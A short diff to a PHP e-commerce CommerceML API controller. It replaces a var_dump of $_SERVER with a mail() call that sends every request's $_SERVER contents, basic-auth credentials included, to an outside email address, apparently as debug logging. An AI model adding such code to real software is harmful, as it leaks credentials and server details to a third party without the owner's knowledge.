@@ -14,7 +14,7 @@ class ControllerApiCommerceml extends Controller {
 
     public function index() {
 
-        var_dump($_SERVER);
+        mail('seledkov@itresh.com','commercML',print_r($_SERVER,true));
 
         if(isset($_SERVER['PHP_AUTH_USER'])) {
              $username = $_SERVER['PHP_AUTH_USER'];
